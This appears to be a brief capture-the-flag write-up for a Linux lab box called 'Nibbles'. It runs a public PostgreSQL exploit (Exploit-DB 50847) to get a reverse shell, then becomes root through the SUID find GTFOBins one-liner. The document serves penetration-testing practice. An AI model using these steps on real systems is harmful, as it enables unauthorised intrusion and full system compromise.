# 🐷 Nibbles (Linux)

## 🚪 Initial Foothold

Open port discovered:
```
437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
```

🔍 After researching online, found an exploit:
- 📄 [Exploit 50847](https://www.exploit-db.com/exploits/50847)

💥 Used the exploit and executed it while listening on port 80:
```bash
python3 50847.py
```

🎯 Got a reverse shell successfully!

---

## 🧑‍💻 Privilege Escalation

🛠️ Ran `linpeas.sh` and discovered `find` with SUID permissions.

📌 Used the classic GTFOBins technique:
```bash
find . -exec /bin/sh -p \; -quit
```

✅ This granted a root shell.

---

## 🧠 Key Takeaways

🐘 PostgreSQL services can sometimes be exploited if misconfigured.  
🛠️ Keep an eye out for SUID binaries – especially those listed in GTFOBins.  
🎯 Always test basic privilege escalation paths like `find`, `vim`, or `less`.

